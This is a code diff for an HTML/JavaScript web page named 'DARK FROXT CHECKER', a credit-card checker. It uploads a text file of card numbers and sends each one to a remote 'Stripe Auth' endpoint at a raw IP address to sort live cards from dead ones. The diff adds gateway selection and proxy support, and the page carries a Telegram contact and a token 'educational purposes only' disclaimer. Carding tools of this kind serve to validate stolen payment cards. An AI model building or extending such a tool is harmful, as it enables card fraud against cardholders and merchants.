@@ -2,41 +2,60 @@
 <html lang="en">
 <head>
   <meta charset="UTF-8">
-  <title>DARK FROXT CHECKER - Upload & Check</title>
+  <title>DARK FROXT CHECKER</title>
   <meta name="viewport" content="width=device-width, initial-scale=1">
   <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@700&display=swap" rel="stylesheet">
   <style>
     body {
-      background: linear-gradient(135deg, #1a202c 0%, #7f1d1d 100%);
+      background: linear-gradient(135deg, #13161b 0%, #581c1c 100%);
       color: #fff;
       font-family: 'Roboto', Arial, sans-serif;
       margin: 0; min-height: 100vh;
     }
-    .container { max-width: 950px; margin: 50px auto; padding: 32px; background: rgba(0,0,0,0.4); border-radius: 20px; box-shadow: 0 8px 30px #0008;}
-    h1 { text-align: center; }
-    .uploader { text-align: center; margin-bottom: 22px; }
-    input[type="file"] { margin-top: 8px; color: #fff; }
-    button { background: #2563eb; color: #fff; border: none; border-radius: 8px; padding: 12px 28px; font-size: 1.15rem; font-weight: bold; cursor: pointer; transition: background 0.2s; margin-top: 10px;}
+    .container { max-width: 440px; margin: 40px auto; background: rgba(0,0,0,0.45); border-radius: 15px; padding: 26px 22px 20px 22px; box-shadow: 0 6px 24px #0008;}
+    header { text-align: center; margin-bottom: 18px; }
+    h1 { margin: 0 0 7px 0; font-size: 1.6rem; letter-spacing: 2px; color: #93c5fd; text-shadow: 0 2px 8px #1e293b70;}
+    .contact { margin: 12px 0 0 0; font-size: 1rem; color: #b2cdfd; text-align: center;}
+    .contact a { color: #60a5fa; text-decoration: none;} .contact a:hover { color: #f87171;}
+    .uploader { display: flex; flex-direction: column; align-items: center; margin-bottom: 12px;}
+    .gateway-group { margin-bottom: 10px; }
+    .gateway-label { font-size: 1.07rem; margin-right: 7px; color: #7dd3fc; font-weight: bold;}
+    select { font-size: 1.07rem; border-radius: 5px; padding: 3px 7px;}
+    .proxy-group { margin-bottom: 10px; width: 100%;}
+    .proxy-label { font-size: 1.02rem; color: #b2cdfd; margin-right: 7px;}
+    input[type="text"] { border-radius: 5px; border: none; font-size: 1.01rem; padding: 4px 8px; width: 98%; margin-top: 3px;}
+    input[type="file"] { margin: 0 0 12px 0; color: #fff; font-size: 1rem; }
+    button { background: #2563eb; color: #fff; border: none; border-radius: 7px; padding: 12px 38px; font-size: 1rem; font-weight: bold; cursor: pointer; box-shadow: 0 2px 8px #1e293b44; margin-bottom: 8px; transition: background 0.2s;}
     button:hover { background: #1d4ed8; }
-    .results { display: flex; gap: 32px; justify-content: center; margin-top: 18px; flex-wrap: wrap;}
-    .result-box { flex: 1 1 370px; background: rgba(0,0,0,0.5); border-radius: 12px; padding: 16px 16px 18px 16px; min-height: 250px; box-shadow: 0 2px 14px #0005; border: 2px solid #333; display: flex; flex-direction: column;}
+    .results { display: flex; gap: 10px; justify-content: center; margin-top: 6px;}
+    .result-box { flex: 1 1 140px; background: rgba(21,22,29,0.8); border-radius: 8px; padding: 10px 8px 12px 8px; min-height: 80px; max-width: 48%; border: 1.5px solid #28303d; font-size: 0.98rem; box-shadow: 0 1.5px 10px #0007; display: flex; flex-direction: column;}
     .approved { border-color: #10b981; }
     .declined { border-color: #ef4444; }
-    .result-box h3 { margin-top: 0; text-align: center; letter-spacing: 1px; }
-    .approved-list, .declined-list { font-family: monospace; font-size: 1.06rem; margin: 0; padding-left: 14px; word-break: break-all; flex: 1 1 auto;}
-    .approved-list { color: #10b981;}
-    .declined-list { color: #ef4444;}
-    .loading { color: #fbbf24; text-align: center; margin-top: 12px;}
-    .note { color: #ccc; font-size: 0.95rem; margin-top: 20px; text-align:center;}
-    a { color: #60a5fa; text-decoration: none;}
-    a:hover { color: #f87171; }
-    @media (max-width: 950px) { .results { flex-direction: column; gap: 20px;} }
+    .result-box h3 { margin: 0 0 8px 0; text-align: center; font-size: 1.07rem; letter-spacing: 1px; color: #fff;}
+    .approved-list { color: #10b981; font-size: 0.95rem; margin: 0;}
+    .declined-list { color: #ef4444; font-size: 0.95rem; margin: 0;}
+    .loading { color: #fbbf24; text-align: center; font-size: 1.02rem; margin: 5px 0 7px 0;}
+    .note { color: #b2cdfd; font-size: 0.89rem; text-align: center; margin-top: 14px; margin-bottom: 2px;}
+    @media (max-width: 520px) {.container { max-width: 98vw; padding: 7vw 1vw; } .results { flex-direction: column; gap: 6px;} .result-box { max-width: 100%; min-height: 64px;}}
   </style>
 </head>
 <body>
   <div class="container">
-    <h1>DARK FROXT CHECKER</h1>
+    <header>
+      <h1>DARK FROXT CHECKER</h1>
+    </header>
     <div class="uploader">
+      <div class="gateway-group">
+        <label class="gateway-label" for="gateway">Gateway:</label>
+        <select id="gateway">
+          <option value="stripe">Stripe Auth</option>
+          <option value="b3" disabled>B3 (Coming Soon)</option>
+        </select>
+      </div>
+      <div class="proxy-group">
+        <label class="proxy-label" for="proxy">Proxy (optional):</label>
+        <input type="text" id="proxy" placeholder="IP:PORT or user:pass@ip:port">
+      </div>
       <input type="file" id="ccFile" accept=".txt">
       <button onclick="checkCardsFromFile()">Check Cards</button>
     </div>
@@ -52,15 +71,26 @@
       </div>
     </div>
     <div class="note">
-      <p>Educational purposes only. Not for fraudulent use.</p>
+      Educational purposes only. Not for fraudulent use.
     </div>
-    <div class="note">
-      <a href="https://t.me/code_wraith" target="_blank">Contact: @Code_Wraith</a>
+    <div class="contact">
+      Contact: <a href="https://t.me/code_wraith" target="_blank">@Code_Wraith</a>
     </div>
   </div>
   <script>
-    const API_URL = "http://46.202.163.144:9090/v1/stripe/cc=";
+    // Add more gateways by extending this function:
+    function getApiUrl(gateway) {
+      if (gateway === "stripe") {
+        return "http://46.202.163.144:9090/v1/stripe/cc=";
+      }
+      // B3 and more: Add here when ready
+      return "";
+    }
+
     async function checkCardsFromFile() {
+      const gateway = document.getElementById("gateway").value;
+      const proxy = document.getElementById("proxy").value.trim();
+      const API_URL = getApiUrl(gateway);
       const fileInput = document.getElementById("ccFile");
       const approvedList = document.getElementById("approvedList");
       const declinedList = document.getElementById("declinedList");
@@ -88,11 +118,20 @@
       for (let i = 0; i < cardLines.length; i++) {
         const card = cardLines[i];
         progress.textContent = `Checking card ${i+1} of ${cardLines.length}...`;
+
         try {
-          const resp = await fetch(API_URL + encodeURIComponent(card));
+          // Build fetch options with proxy support (demo, real use requires backend or CORS proxy)
+          let fetchOptions = {};
+          if (proxy) {
+            // You cannot use a proxy directly from browser JS fetch (browser security)
+            // Instead, send the proxy string as a header or param for your backend/API to use
+            fetchOptions = {
+              headers: { 'X-Proxy': proxy }
+            };
+          }
+          const resp = await fetch(API_URL + encodeURIComponent(card), fetchOptions);
           const text = await resp.text();
 
-          // Try to parse JSON, fallback to text
           let approved = false;
           let message = text;
           try {
